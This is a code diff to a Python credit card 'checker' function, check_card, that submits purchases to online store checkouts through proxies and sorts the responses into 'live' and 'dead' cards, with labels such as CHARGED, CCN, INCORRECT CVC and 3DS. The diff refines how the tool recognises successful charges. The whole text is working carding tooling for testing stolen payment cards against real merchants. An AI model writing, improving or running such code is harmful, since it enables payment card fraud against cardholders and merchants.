@@ -408,31 +408,39 @@ def check_card(card_str, site_url, proxy_str):
         
         response = make_request(purl, 'POST', headers=phead, json_data=pload, proxy=proxy)
         response_text = response.text
+        response_json = response.json()
         
-        # Check final status
-        if 'thank_you' in response_text or 'post_purchase' in response_text:
-            return {'status': 'live', 'message': f'CHARGED ${total_amount} | {gateway_result}'}
-        elif 'order is confirmed' in response_text.lower():
-            return {'status': 'live', 'message': f'ORDER PLACED ${total_amount} | {gateway_result}'}
+        # Determine final status - matching original script responses exactly
+        if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
+            return {'status': 'live', 'message': f'[CHARGED] SUCCESS! | Amount: ${total_amount} | Gateway: {gateway_result}'}
+        
+        elif 'Your order is confirmed' in response_text:
+            return {'status': 'live', 'message': f'[ORDER PLACED] SUCCESS! | Amount: ${total_amount}'}
+        
         elif 'INCORRECT_ZIP' in response_text:
-            return {'status': 'live', 'message': f'CCN (Incorrect ZIP) | {gateway_result}'}
+            return {'status': 'live', 'message': f'[CHARGED] INCORRECT ZIP! | Amount: ${total_amount}'}
+        
         elif 'INSUFFICIENT_FUNDS' in response_text:
-            return {'status': 'live', 'message': f'CCN (Insufficient Funds) | {gateway_result}'}
+            return {'status': 'live', 'message': f'[CHARGED] INSUFFICIENT FUNDS! | Amount: ${total_amount}'}
+        
         elif 'INCORRECT_CVC' in response_text:
-            return {'status': 'live', 'message': f'CCN (Incorrect CVC) | {gateway_result}'}
+            return {'status': 'live', 'message': f'[CCN] INCORRECT CVC! | Amount: ${total_amount}'}
+        
         elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text:
-            return {'status': 'live', 'message': f'3DS Required | {gateway_result}'}
-        elif 'CARD_DECLINED' in response_text or 'declined' in response_text.lower():
-            return {'status': 'dead', 'message': f'Declined | {gateway_result}'}
-        elif 'EXPIRED_CARD' in response_text:
-            return {'status': 'dead', 'message': f'Expired | {gateway_result}'}
-        elif 'PROCESSING_ERROR' in response_text:
-            return {'status': 'dead', 'message': f'Processing Error | {gateway_result}'}
+            return {'status': 'live', 'message': f'[3DS] VERIFICATION REQUIRED! | Amount: ${total_amount}'}
+        
+        elif '/authentications/' in response_text:
+            return {'status': 'live', 'message': f'[3DS] CARD REQUIRES 3D SECURE! | Amount: ${total_amount}'}
+        
+        elif 'processingError' in response_text:
+            error_code = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
+            return {'status': 'dead', 'message': f'[DEAD] {error_code} | Amount: ${total_amount}'}
+        
         else:
-            return {'status': 'live', 'message': f'Processed | {gateway_result}'}
+            return {'status': 'unknown', 'message': f'[UNKNOWN] Response needs review'}
             
     except Exception as e:
-        return {'status': 'live', 'message': f'Receipt check failed: {str(e)}'}
+        return {'status': 'unknown', 'message': f'[ERROR] {str(e)}'}
 
 if __name__ == "__main__":
     if len(sys.argv) < 4:
